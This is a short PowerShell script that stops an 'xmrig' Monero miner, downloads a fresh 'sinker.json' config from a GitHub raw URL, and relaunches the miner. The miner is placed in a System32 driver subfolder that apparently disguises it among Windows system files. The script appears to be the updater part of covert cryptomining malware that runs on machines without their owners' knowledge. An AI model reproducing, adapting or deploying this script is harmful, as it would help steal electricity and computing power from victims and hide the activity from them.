# Declared Values
$output3 = "C:\Windows\System32\drivers\en-US\etc\sinker.json"
$url3 = "https://raw.githubusercontent.com/diggles9991/RunMG/master/XMR/sinker.json"
$processpath = 'C:\Windows\System32\drivers\en-US\etc\'
$processname = 'xmrig'
$processtype = '.exe'


# Stop running process
Stop-Process -Name $processname


# Delete existing config file
Remove-Item $output3


# Download Instructions
Import-Module BitsTransfer
Start-BitsTransfer -Source $url3 -Destination $output3


# Start Mining
Start-Process $processpath+$processname+$processtype -ArgumentList "-c $output3"